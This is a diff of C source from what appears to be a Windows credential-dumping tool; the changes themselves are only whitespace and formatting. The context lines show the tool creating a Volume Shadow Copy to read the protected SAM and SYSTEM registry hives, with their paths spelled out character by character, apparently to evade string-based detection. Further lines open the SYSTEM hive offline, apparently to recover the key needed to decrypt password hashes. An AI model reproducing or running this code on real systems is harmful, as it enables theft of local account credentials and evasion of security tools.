@@ -11,7 +11,7 @@
 // Special mention to ShadowDuplicator from Peter Upfold because I took some much code from it to implement the shadow copy method and get SYSTEM and SAM from it
 // https://github.com/PeterUpfold
 // 
- 
+
 #define _CRT_SECURE_NO_WARNINGS
 
 #include <vss.h>
@@ -27,16 +27,16 @@ BOOL createSS(WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)], WCHAR sourcePat
 	HRESULT result;
 	int strResult;
 	BOOL resultRead;
-	BYTE * SAM;
-	BYTE * SYSTEM;
+	BYTE* SAM;
+	BYTE* SYSTEM;
 	DWORD numberBytesRead;
 	DWORD fileSize;
 	HANDLE file;
-	IVssBackupComponents * backupComponents = NULL;
-	IVssAsync * vssAsync = NULL;
+	IVssBackupComponents* backupComponents = NULL;
+	IVssAsync* vssAsync = NULL;
 	HRESULT asyncResult = E_FAIL;
-	VSS_ID * snapshotSetId = NULL;
-	VSS_ID * snapshotId = NULL;
+	VSS_ID* snapshotSetId = NULL;
+	VSS_ID* snapshotId = NULL;
 	VSS_SNAPSHOT_PROP snapshotProp{};
 
 	// For now, we presuppose C:
@@ -54,7 +54,7 @@ BOOL createSS(WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)], WCHAR sourcePat
 	if (result != S_OK) {
 		exit(result);
 	}
-	
+
 	result = CreateVssBackupComponents(&backupComponents);
 
 	if (result != S_OK) {
@@ -160,7 +160,6 @@ BOOL createSS(WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)], WCHAR sourcePat
 	// SAM
 	WCHAR auxSAM[] = { L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'C',L'o',L'n',L'f',L'i',L'g',L'\\',L'S',L'A',L'M', L'\0' };
 	strResult = swprintf(sourcePathFileSAM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, auxSAM);
-
 	// SYSTEM
 	WCHAR auxSYSTEM[] = { L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'C',L'o',L'n',L'f',L'i',L'g',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M', L'\0' };
 	strResult = swprintf(sourcePathFileSYSTEM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, auxSYSTEM);
@@ -359,7 +358,7 @@ void getClassesfromRegf(PSAM samRegEntry, WCHAR SYSTEMPath[MAX_PATH]) {
 	if (!NT_SUCCESS(ret)) {
 		exit(ret);
 	}
-	
+
 	ret = OROpenKey(systemHive, L"ControlSet001", &key);
 
 	if (!NT_SUCCESS(ret)) {
